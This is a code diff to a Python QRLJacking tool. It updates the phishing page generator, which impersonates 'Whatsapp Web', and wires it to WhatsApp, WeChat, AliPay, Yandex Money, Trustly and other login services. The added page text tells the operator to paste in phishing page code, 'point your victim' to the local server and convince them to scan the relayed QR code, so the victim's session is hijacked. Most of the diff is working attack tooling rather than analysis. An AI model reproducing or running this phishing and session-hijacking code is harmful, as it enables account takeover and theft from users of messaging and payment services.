@@ -370,32 +370,52 @@ def Yelophone():
 		except:
 			break
 
-def make(typ="html"):
+def make( service_name , port , typ="html" ):
 	if typ == "html":
 		code = """<html>
-<head><title>Whatsapp Web</title></head><body><script>
+<head>
+<title>Whatsapp Web</title>
+</head>
+<body><script>
 var myTimer;
 myTimer = window.setInterval(reloadD,3000);
 function reloadD(){
 d = new Date();
 document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
 }
-</script><center><h1><b>Scan Me Please</b></h1>
-<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;"></center>
-</body></html>"""
+</script><center>
+<h1><b>Scan Me Please</b></h1>
+Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
+0. This is your *always updated {0} QR Code*
+<img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
+1. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)
+2. Point your victim to <a href="http://Your_IP:{1}" /a>, Convince to scan the QR code and Bob is your uncle!
+</center>
+</body>
+</html>""".format( service_name , port )
 
 	if typ == "svg":
 		code = """<html>
-<head><title>Whatsapp Web</title></head><body><script>
+<head>
+<title>Whatsapp Web</title>
+</head>
+<body><script>
 var myTimer;
 myTimer = window.setInterval(reloadD,3000);
 function reloadD(){
 d = new Date();
-document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();
+document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();
 }
-</script><center><h1><b>Scan Me Please</b></h1>
-<object id="qrcodew" data="tmp.svg" type="image/svg+xml"></object></center>
-</body></html>"""
+</script><center>
+<h1><b>Scan Me Please</b></h1>
+Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
+0. This is your *always updated {0} QR Code*
+<img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;">
+1. Edit me by adding your phishing page source code, style, resources, etc.. ( I'm the "Index.html" resides in the framework folder)
+2. Point your victim to <a href="http://Your_IP:{1}" /a>, Convince to scan the QR code and Bob is your uncle!
+</center>
+</body>
+</html>""".format( service_name , port )
 	f = open("index.html","w")
 	f.write(code)
 	f.close()
@@ -437,7 +457,7 @@ def Add_website():
 		print " [+] Settings saved."
 		print " [+] Running the exploit..."
 		print "="*12
-		make()
+		make( name , port )
 		Serve_it(port)
 		First_Method(classname,url,image_number,Seconds)
 		main()
@@ -468,7 +488,7 @@ def Add_website():
 		print " [+] Settings saved."
 		print " [+] Running the exploit..."
 		print "="*12
-		make()
+		make( name , port )
 		Serve_it( port )
 		Second_Method( url , image_number , Seconds )
 		main()
@@ -499,7 +519,7 @@ def Add_website():
 		print " [+] Settings saved."
 		print " [+] Running the exploit..."
 		print "="*12
-		make()
+		make( name , port )
 		Serve_it( port )
 		Third_Method( url , image_number , Seconds )
 		main()
@@ -659,6 +679,7 @@ def main():
   6.Mobile Management Software
   7.Other Services
   8.Customization
+  9.Exit
 """
 	choice = raw_input(" Choice > ")
 	if not choice.isdigit():
@@ -666,6 +687,12 @@ def main():
 	else:
 		choice = int(choice)
 	#Chat Applications
+
+	if choice == 9:
+		print "=====Goodbye====="
+		time.sleep(1.5)
+		exit(0)
+
 	if choice == 1:
 		print """
  1.WhatsApp
@@ -690,7 +717,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "Whatsapp" , port )
 			Serve_it(port)
 			whatsapp()
 			main()
@@ -706,7 +733,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "WeChat" , port )
 			Serve_it(port)
 			WeChat()
 			main()
@@ -716,7 +743,7 @@ def main():
 			port = raw_input(" Port to listen on (Default 1337) : ")
 			if port == "":port = 1337
 			clear()
-			make()
+			make( "Weibo" , port )
 			Serve_it(port)
 			Weibo()
 			main()
@@ -746,7 +773,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make("svg")
+			make( "Yandex" , port , "svg")
 			Serve_it(port)
 			Yandex()
 			main()
@@ -776,7 +803,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "Taobao" , port )
 			Serve_it(port)
 			Taobao()
 			main()
@@ -792,7 +819,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "Taobao Trips" , port )
 			Serve_it(port)
 			Taobao()
 			main()
@@ -822,7 +849,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "AliPay" , port )
 			Serve_it(port)
 			AliPay()
 			main()
@@ -838,7 +865,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "Yandex Money" , port )
 			Serve_it(port)
 			Yandex()
 			main()
@@ -867,7 +894,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "Yandex passport" , port )
 			Serve_it(port)
 			Yandex()
 			main()
@@ -897,7 +924,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "Airdroid" , port )
 			Serve_it(port)
 			Airdroid()
 			main()
@@ -929,7 +956,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "MyDigiPass" , port )
 			Serve_it(port)
 			mydigipass()
 			main()
@@ -945,7 +972,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "Zapper" , port )
 			Serve_it(port)
 			Zapper()
 			main()
@@ -961,7 +988,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "Trustly app" , port )
 			Serve_it(port)
 			Trustly_App()
 			main()
@@ -977,7 +1004,7 @@ def main():
 			if port == "":
 				port = 1337
 			clear()
-			make()
+			make( "Yelophone" , port )
 			Serve_it(port)
 			Yelophone()
 			main()
